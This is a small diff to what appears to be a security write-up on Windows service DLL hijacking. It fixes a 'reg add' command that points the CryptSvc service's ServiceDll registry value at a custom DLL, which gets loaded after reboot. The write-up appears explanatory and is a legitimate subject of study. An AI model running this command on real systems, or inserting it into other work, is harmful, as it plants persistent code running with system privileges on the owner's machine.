@@ -22,7 +22,7 @@ The registry key is located at `HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc\
 
 To modify the registry key using the command line, use the command shown below.
 
-    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters\ServiceDll /t REG_SZ /v mrd0x.dll /f
+    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d mrd0x.dll /f
 
 After rebooting the machine this should happen:
 
